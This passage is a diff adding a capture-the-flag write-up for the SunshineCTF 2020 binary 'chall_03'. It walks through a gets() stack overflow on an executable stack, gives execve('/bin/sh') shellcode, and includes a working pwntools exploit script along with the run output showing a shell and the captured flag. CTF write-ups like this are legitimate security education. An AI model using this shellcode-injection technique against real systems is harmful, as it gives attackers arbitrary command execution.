@@ -509,3 +509,117 @@ Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\xf7R\xbaeU
 $ cat flag.txt
 sun{chapter-four-9ca97769b74345b1}
 ```
+
+## chall_03
+---
+```c
+void main(void)
+
+{
+  char local_28 [32];
+  
+  puts("Just in time.");
+  fgets(local_28,0x13,stdin);
+  vuln();
+  return;
+}
+
+void vuln(void)
+
+{
+  char local_78 [112];
+  
+  printf("I\'ll make it: %p\n",local_78);
+  gets(local_78);
+  return;
+}
+
+```
+
+`main` and `vuln` are the only functions in this binary. The print statement reveals the address of `local_78` on the stack. 
+
+Looking at `checksec` can give some inspiration for attacks to try:
+
+```sh
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ checksec chall_03
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_03'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+```
+
+RWX means the binary has segments that are readable writable and executable. Since there is no `win` function, we will be able to write our own, inject it via `gets`, and then have the program execute it. We can fill `local_78` with shellcode that will run `/bin/sh`, and then overwrite the return address of `vuln()` to return to the beginning of that shellcode.
+
+Shellcode to inject:
+```assembly
+/* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push b'/bin///sh\\x00' */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\\x00'] */
+    /* push b'sh\\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+
+```
+
+Exploit:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.binary = ELF('./chall_03')
+
+if args.REMOTE:
+    io = remote('chal.2020.sunshinectf.org', 30003)
+else:
+    io = process(context.binary.path)    
+print(io.recvline())
+io.sendline('throwaway')
+response = str(io.recvline()) # 'b"I'll make it: 0x000xyz\\n"'
+stack_address = re.search("0x[0-9a-f]+", response).group()
+
+payload = asm(shellcraft.sh())
+buffer = 'A' * (0x78 - len(payload))
+exploit = flat(payload, buffer, p64(int(stack_address, 16)))
+
+print("Sending: ", exploit)
+io.sendline(exploit)
+
+io.interactive()
+```
+
+```sh
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_03.py REMOTE
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_03'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
+b'Just in time.\n'
+Sending:  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\x86)\x04\xfe\x7f\x00\x00'
+[*] Switching to interactive mode
+$ cat flag.txt
+sun{a-little-piece-of-heaven-26c8795afe7b3c49}
+```
